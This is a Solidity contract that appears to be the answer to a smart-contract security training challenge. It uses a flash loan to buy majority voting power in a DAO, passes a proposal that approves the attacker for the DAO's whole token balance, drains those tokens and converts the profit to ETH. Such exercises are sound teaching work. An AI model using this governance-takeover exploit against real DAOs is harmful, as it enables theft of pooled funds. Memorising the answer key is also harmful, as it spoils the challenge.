//SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

//Importing the uniswap router so that we can make exchanges
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

//Importing the ERC20 interface so we can interact with the tokens
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

//import DAO & Pool interfaces
import "../Challenge-4/DAO.sol";
import "../Challenge-4/TokenLender.sol";



//If you want to test this contract you can do so by changing the contract name to Attack4
//If you have a contract with the name Attack4 already make sure to comment your attack contract out
//You cnan mass comment out a section by highlighting multiple lines & pressing ctrl + /  
contract Attack4Solved {

    //Declaring an instance of the router interface
    IUniswapV2Router02 router;

    //Declaring an instance of the flashloan pool interface
    IPool pool;

    //Declaring an instance of the DAO interface
    IDAO DAO;

    //Declaring an instance of the ERC20 interface for Token A & Token B
    IERC20 tokenA;///borrowing
    IERC20 tokenB;//governence

    //Storing the address of the WETH contract
    address private weth;

    
    constructor(
        address _router,
        address _pool,
        address _DAO,
        address _tokenA,
        address _tokenB,
        address _weth
    ){
        //Instantiating an instance of the uniswap router
        router = IUniswapV2Router02(_router);

        //Instantiating an instance of the flashloan pool
        pool = IPool(_pool);

        //Instantiating an instance of the DAO 
        DAO = IDAO(_DAO);

        //Instantiating an instance of the ERC20 Tokens
        tokenA = IERC20(_tokenA);
        tokenB = IERC20(_tokenB);

        //Storing the WETH address into storage
        weth = _weth;
    }

    //Our function called by the test script
    //Used to execute our exploit
    function attack() external {

        //Start the flashloan & borrow the whole balance of the pool
        pool.flashLoan(tokenA.balanceOf(address(pool)));

        //Transfer ETH to the caller of this function
        //This will only be ran after the receiveLoan function & flashloan function have finished
        (bool success,) = msg.sender.call{value: address(this).balance}("");

        //Check that the transfer of ETH was successful
        require(success,"ERR:OT");//OT => On Transfer
    }

    //This function is called by the pool during the flashloan function
    function receiveLoan() external {

        //Check that the caller is the flashloan pool
        require(msg.sender == address(pool),"ERR:NP");//NP => Not Pool

        //Build path from TokenA -> TokenB
        address[] memory path = new address[](2);
        path[0] = address(tokenA);
        path[1] = address(tokenB);

        //Get the current balance of TokenA for this contract
        uint256 startingBal = tokenA.balanceOf(address(this));

        //Approve the router to spend our current balance of tokenA
        tokenA.approve(address(router), startingBal);

        //Swap TokenA for Token B
        router.swapExactTokensForTokens(startingBal, 0, path, address(this), block.timestamp);

        uint256 tokenBBal = tokenB.balanceOf(address(this));

        //Approve the DAO for our total balance of TokenB
        tokenB.approve(address(DAO), tokenBBal);

        //Get the balance of the DAO
        uint256 balOfDAO = tokenB.balanceOf(address(DAO));

        //Check that our current balance of TokenB is enough to make the attack
        require((tokenBBal * 100) / tokenBBal + balOfDAO >= 51, "ERR:NE");//NE => Not Enough

        //Deposit all our TokenB into the DAO
        DAO.deposit();

        //Calculate the full amount to steal
        uint256 fullTokenBBal = balOfDAO + tokenBBal;

        //Build the data that will be proposed
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            fullTokenBBal
        );

        //Propose the target as TokenB & the data the DAO must call 
        DAO.propose(address(tokenB), data);

        require(tokenB.allowance(address(DAO),address(this)) == fullTokenBBal,"ERR:NA");//NA => Not Approved

        //Transfer the amount we're stealing from the DAO to this address
        tokenB.transferFrom(address(DAO), address(this), fullTokenBBal);

        //Build a path from TokenB -> TokenA
        address[] memory reversePath = new address[](2);
        reversePath[0] = address(tokenB);
        reversePath[1] = address(tokenA);

        //Approve the router to spend our full TokenB Balance
        tokenB.approve(address(router), fullTokenBBal);
        
        //Swap from TokenB -> TokenA
        router.swapExactTokensForTokens(fullTokenBBal, 0, reversePath, address(this), (block.timestamp));
    
        // //Transfer the amount of TokenA that we intially started with back to the pool
        tokenA.transfer(address(pool), startingBal);

        //Get the remaining balance of TokenA 
        uint256 toEth = tokenA.balanceOf(address(this));

        //Build a path from TokenA -> ETH
        address[] memory pathToEth = new address[](2);
        pathToEth[0] = address(tokenA);
        pathToEth[1] = weth;
 
        //Approve the router to spend our tokenA Balance
        tokenA.approve(address(router),toEth);

        //Swap TokenA -> ETH
        router.swapExactTokensForETH(toEth, 0, pathToEth, address(this), block.timestamp);
    }

    //This is here so that our contract can receive ETH
    receive() external payable{}
}